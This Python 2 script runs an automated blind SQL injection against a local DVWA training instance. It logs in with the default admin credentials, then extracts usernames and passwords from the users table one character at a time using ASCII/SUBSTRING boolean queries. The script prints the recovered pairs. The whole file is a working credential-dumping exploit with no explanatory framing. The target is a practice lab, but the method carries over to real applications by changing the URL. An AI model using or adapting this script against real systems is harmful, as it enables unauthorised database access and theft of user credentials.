from bs4 import BeautifulSoup
import requests

session = requests.Session()
username = []
password = []

def login():
	url = "http://localhost/DVWA/login.php"
	result = session.get(url)
	usertoken =  BeautifulSoup(result.text, 'html.parser').find('input', {'name':'user_token'}).get('value')
	params = {"username":"admin","password":"password","Login":"Login","user_token":usertoken}
	result = session.post(url, data=params)


def dump_username():
	url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
	result = session.get(url)
	limit = 0
	while True:
		substring = 1
		flag = ""
		ascii_num = 32
		while(ascii_num < 127):
			query = "1 AND ASCII(SUBSTRING((SELECT user FROM users LIMIT {}, 1), {}, 1)) = {}#".format(limit, substring, ascii_num)
			params = {"id":query, "Submit":"Submit"}
			result = session.post(url, data=params)
			if "exists" in result.text:
				flag += chr(ascii_num)
				print flag
				ascii_num = 32
				substring += 1
			else:
				ascii_num += 1

		if(len(flag) != 0):
			limit += 1
			print flag
			username.append(flag)
		else:
			break

def dump_password():
	url = "http://localhost/DVWA/vulnerabilities/sqli_blind/"
	result = session.get(url)
	limit = 0
	while True:
		substring = 1
		flag = ""
		ascii_num = 32
		while(ascii_num < 127):
			query = "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT {}, 1), {}, 1)) = {}#".format(limit, substring, ascii_num)
			params = {"id":query, "Submit":"Submit"}
			result = session.post(url, data=params)
			if "exists" in result.text:
				flag += chr(ascii_num)
				print flag
				ascii_num = 32
				substring += 1
			else:
				ascii_num += 1

		if(len(flag) != 0):
			limit += 1
			print flag
			password.append(flag)
		else:
			break

login()
dump_username()
dump_password()

for i in range(len(username)):
	print username[i] + " -> " + password[i]